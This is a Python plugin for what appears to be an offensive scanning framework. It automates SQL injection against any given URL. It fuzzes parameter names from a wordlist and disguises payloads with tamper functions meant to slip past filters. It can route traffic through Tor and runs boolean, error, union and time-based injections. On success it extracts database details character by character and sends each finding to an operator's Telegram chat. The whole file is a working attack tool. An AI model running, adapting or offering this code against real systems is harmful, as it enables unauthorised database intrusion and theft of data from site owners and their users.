"""
RedCortex Plugin: SQLi (wordlists, DBMS auto, blind, proxy, POST/GET, Telegram, session log)
Drop-in, no hardcoded params/DB strings; everything from ./wordlists.
"""

import requests, random, time, threading, os, urllib.parse, json, difflib

TELEGRAM_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64; rv:52.0)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2)",
    "Mozilla/5.0 (Android 10; SM-G973F)"
]
COOKIES = ["", "PHPSESSID=abc123", "sessionid=test"]
PROXIES = [None, {"http": "socks5h://127.0.0.1:9050"}]
HEADERS_EXTRA = [{"X-Forwarded-For": "127.0.0.1"}, {"Referer": "https://example.com"}, {}]

def _coerce_to_str(u):
    if isinstance(u, str):
        return u
    try:
        candidate = getattr(u, "url", None)
        if isinstance(candidate, str):
            return candidate
    except Exception:
        pass
    try:
        s = str(u)
        if "://" in s or s.startswith("/") or s.startswith("http"):
            return s
    except Exception:
        pass
    return None

def load_wordlist(filepath):
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except Exception as e:
        return []

def load_dbms_signatures(wordlists_dir):
    dbms_sigs = {}
    for fname in os.listdir(wordlists_dir):
        if fname.endswith(".txt"):
            dbms = fname.split('.')[0].lower()
            path = os.path.join(wordlists_dir, fname)
            dbms_sigs[dbms] = load_wordlist(path)
    return dbms_sigs

# All tamper suite
def inline_comment(p): return p.replace(" or ", " /**/or/**/ ").replace(" and ", " /**/and/**/ ")
def charcode(p): return "CHAR(" + ",".join(str(ord(ch)) for ch in p) + ")"
def concat(p): return "'||%s||'" % p
def hex_encode(p): return "0x" + p.encode("utf-8").hex()
def add_comment(p): return p + " --"
def random_case(p): return ''.join([c.upper() if i%2 else c for i, c in enumerate(p)])
def double_encode(p): return urllib.parse.quote(urllib.parse.quote(p, safe=''), safe='')
TAMPERS = [
    lambda x: x, add_comment, inline_comment, charcode,
    concat, hex_encode, random_case, double_encode
]
def is_similar(a, b):  # Fuzzy matcher
    return difflib.SequenceMatcher(None, a, b).ratio() > 0.97

def detect_dbms_auto(response, dbms_error_map):
    response_lower = response.lower()
    matchcount = {}
    for dbms, sigs in dbms_error_map.items():
        hits = sum(1 for sig in sigs if sig.lower() in response_lower)
        if hits:
            matchcount[dbms] = hits
    return max(matchcount, key=matchcount.get) if matchcount else "unknown"

def send_req(url, params, method="GET", proxy=None, extra_headers=None, cookie=""):
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    if extra_headers: headers.update(extra_headers)
    if cookie:
        headers["Cookie"] = cookie
    kwargs = {}
    if proxy: kwargs["proxies"] = proxy
    try:
        if method == "GET":
            resp = requests.get(url, params=params, headers=headers, timeout=11, **kwargs)
        elif method == "POST":
            resp = requests.post(url, data=params, headers=headers, timeout=11, **kwargs)
        elif method == "JSON":
            resp = requests.post(url, json=params, headers=headers, timeout=11, **kwargs)
        else:
            return None, "", 0
        return resp.status_code, resp.text, getattr(resp.elapsed, "total_seconds", lambda: 0)()
    except Exception as e:
        return None, str(e), 0

def send_telegram(msg):
    if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": msg}
        try:
            requests.post(url, data=payload, timeout=8)
        except Exception:
            pass

BOOLEAN_PAYLOADS = [
    ("1 AND 1=1", "1 AND 1=2"), ("1' AND 1=1-- -", "1' AND 1=2-- -"),
    ("1\") AND 1=1-- -", "1\") AND 1=2-- -"), ("1 OR 1=1", "1 OR 1=2"), ("1' OR '1'='1", "1' OR '1'='0")
]
ERROR_PAYLOADS = ["'", '"', "1'", "1\")", "1'--", "1\")--"]
UNION_PAYLOADS = [
    "1 UNION SELECT NULL-- -", "1' UNION SELECT 1,2,3-- -",
    "1 UNION SELECT version(),user(),database()--+"
]
TIMEBASED_PAYLOADS = [
    "1 AND SLEEP(5)--", "1 OR SLEEP(5)#", "1);WAITFOR DELAY '0:0:5'--",
    "1);SELECT pg_sleep(5)--"
]

def threaded_blind_extract(url, param, db_type, delay_s=0.3, maxlen=32):
    charspace = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@._-"
    queries = {
        "mysql": "SELECT DATABASE()",
        "postgres": "SELECT current_database()",
        "mssql": "SELECT DB_NAME()",
        "oracle": "SELECT user FROM dual",
        "sqlite": "SELECT sqlite_version()"
    }
    sql = queries.get(db_type, "SELECT version()")
    result = []
    def exfil(pos):
        for ch in charspace:
            payload = f"1 AND ascii(substring(({sql}),{pos},1))={ord(ch)}"
            params = {param: payload}
            sc, body, _ = send_req(url, params)
            if sc and "error" not in body.lower() and abs(len(body) - len("".join(result))) > 2:
                result.append(ch)
                print(f"\r[char {pos}] => {''.join(result)}", end="", flush=True)
                break
    threads = []
    for pos in range(1, maxlen+1):
        t = threading.Thread(target=exfil, args=(pos,))
        t.start()
        threads.append(t)
        time.sleep(delay_s)
    for t in threads: t.join()
    print("")
    return "".join(result)

def run(session, url, **kwargs):
    url_str = _coerce_to_str(url) or _coerce_to_str(session)
    if not url_str:
        return []
    findings = []
    wordlists_dir = os.path.join(os.path.dirname(__file__), "..", "wordlists")
    param_list = load_wordlist(os.path.join(wordlists_dir, "burp-parameter-names.txt"))
    dbms_error_map = load_dbms_signatures(wordlists_dir)
    sessionlog = []
    try:
        for method in ["GET", "POST", "JSON"]:
            for param_name in param_list:
                for tamper in TAMPERS:
                    for cookie in COOKIES:
                        for proxy in PROXIES:
                            for extra_header in HEADERS_EXTRA:
                                for true_pay, false_pay in BOOLEAN_PAYLOADS:
                                    tr, fa = tamper(true_pay), tamper(false_pay)
                                    params_true, params_false = {param_name: tr}, {param_name: fa}
                                    sc_true, body_true, _ = send_req(url_str, params_true, method, proxy, extra_header, cookie)
                                    sc_false, body_false, _ = send_req(url_str, params_false, method, proxy, extra_header, cookie)
                                    dbms = detect_dbms_auto(body_true + body_false, dbms_error_map)
                                    match = (sc_true == sc_false == 200 and not is_similar(body_true, body_false) and abs(len(body_true) - len(body_false)) > 6)
                                    if match:
                                        blind = ""
                                        if dbms != "unknown":
                                            blind = threaded_blind_extract(url_str, param_name, dbms)
                                        msg = f"[+] SQLi(Boolean) {param_name}@{url_str} DBMS={dbms} blind:{blind}"
                                        print(msg)
                                        send_telegram(msg)
                                        fdict = {
                                            "type": "SQLi-Boolean", "desc": msg,
                                            "param": param_name, "payload": tr, "dbms": dbms, "blind": blind,
                                            "url": url_str, "method": method, "cookie": cookie, "proxy": proxy, "header": extra_header
                                        }
                                        findings.append(fdict)
                                        sessionlog.append(fdict)
                                        json.dump(sessionlog, open("sqli_session.json", "w"), indent=2)
                                        return findings
                                for pay in ERROR_PAYLOADS:
                                    p_err = tamper(pay)
                                    params_err = {param_name: p_err}
                                    sc, body, _ = send_req(url_str, params_err, method, proxy, extra_header, cookie)
                                    dbms = detect_dbms_auto(body, dbms_error_map)
                                    if dbms != "unknown":
                                        msg = f"[+] SQLi(Error) {param_name}@{url_str} DBMS={dbms}"
                                        print(msg)
                                        send_telegram(msg)
                                        fdict = {
                                            "type": "SQLi-Error", "desc": msg, "param": param_name,
                                            "payload": p_err, "dbms": dbms, "url": url_str,
                                            "method": method, "cookie": cookie, "proxy": proxy, "header": extra_header
                                        }
                                        findings.append(fdict); sessionlog.append(fdict)
                                        json.dump(sessionlog, open("sqli_session.json", "w"), indent=2)
                                        return findings
                                for up in UNION_PAYLOADS:
                                    p_union = tamper(up)
                                    params_union = {param_name: p_union}
                                    sc, body, _ = send_req(url_str, params_union, method, proxy, extra_header, cookie)
                                    dbms = detect_dbms_auto(body, dbms_error_map)
                                    if dbms != "unknown" and any(marker in body for marker in ["NULL", "version()", "user()"]):
                                        msg = f"[+] SQLi(Union) {param_name}@{url_str} DBMS={dbms}"
                                        print(msg)
                                        send_telegram(msg)
                                        fdict = {"type": "SQLi-Union", "desc": msg,
                                            "param": param_name, "payload": p_union, "dbms": dbms, "url": url_str,
                                            "method": method, "cookie": cookie, "proxy": proxy, "header": extra_header
                                        }
                                        findings.append(fdict); sessionlog.append(fdict)
                                        json.dump(sessionlog, open("sqli_session.json", "w"), indent=2)
                                        return findings
                                for tbp in TIMEBASED_PAYLOADS:
                                    tbpay = tamper(tbp)
                                    params_tb = {param_name: tbpay}
                                    sc, body, elapsed = send_req(url_str, params_tb, method, proxy, extra_header, cookie)
                                    dbms = detect_dbms_auto(body, dbms_error_map)
                                    if sc == 200 and elapsed > 4:
                                        blind = ""
                                        if dbms != "unknown":
                                            blind = threaded_blind_extract(url_str, param_name, dbms)
                                        msg = f"[+] SQLi(TimeBlind) {param_name}@{url_str} DBMS={dbms} DELAY:{elapsed:.1f}s blind:{blind}"
                                        print(msg)
                                        send_telegram(msg)
                                        fdict = {
                                            "type": "SQLi-Blind-Time", "desc": msg,
                                            "param": param_name, "payload": tbpay, "dbms": dbms, "blind": blind,
                                            "url": url_str, "method": method, "cookie": cookie, "proxy": proxy, "header": extra_header
                                        }
                                        findings.append(fdict); sessionlog.append(fdict)
                                        json.dump(sessionlog, open("sqli_session.json", "w"), indent=2)
                                        return findings
    except KeyboardInterrupt:
        json.dump(sessionlog, open("sqli_session.json", "w"), indent=2)
        return findings
    except Exception:
        return []
    # Final JSON-compat filter
    out = []
    for f in findings:
        try:
            d = dict(f)
            for k, v in list(d.items()):
                if hasattr(v, "__dict__") or "Session" in str(type(v)):
                    d[k] = str(v)
            out.append(d)
        except Exception:
            continue
    return out
